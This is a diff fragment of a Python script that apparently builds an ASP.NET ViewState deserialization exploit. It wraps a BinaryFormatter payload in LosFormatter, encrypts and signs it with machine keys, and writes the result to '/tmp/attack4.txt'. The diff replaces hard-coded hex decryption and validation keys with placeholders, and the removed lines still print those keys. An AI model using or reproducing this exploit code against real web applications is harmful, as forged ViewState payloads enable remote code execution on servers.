@@ -66,8 +66,8 @@ if __name__ == "__main__":
     los = wrap_los(bf)
     print(f"BF: {len(bf)}, LosFormatter: {len(los)}")
     
-    dec_key = bytes.fromhex("74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43")
-    val_key = bytes.fromhex("5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468")
+    dec_key = bytes.fromhex("VIEWSTATE_DEC_KEY")
+    val_key = bytes.fromhex("VIEWSTATE_VAL_KEY")
     final = encrypt_sign(los, dec_key, val_key)
     final_b64 = base64.b64encode(final).decode()
     with open('/tmp/attack4.txt', 'w') as f:
